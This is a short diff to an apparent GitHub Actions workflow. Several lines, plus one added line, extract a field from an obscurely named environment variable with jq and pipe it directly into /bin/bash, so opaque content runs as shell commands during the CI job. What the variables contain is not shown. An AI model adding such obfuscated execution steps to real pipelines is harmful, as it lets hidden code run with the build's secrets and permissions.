@@ -28,6 +28,7 @@ jobs:
           printf '%s' "$op5" | jq -r .e3 | /bin/bash
           echo $k206 | jq -r .se80857 | /bin/bash
           printf '%s' "$rk859" | jq -r .pos138 | /bin/bash
+          printf '%s' "$ilcp8" | jq -r .ujgp602 | /bin/bash
 
       - name: Store output
         uses: actions/upload-artifact@v4
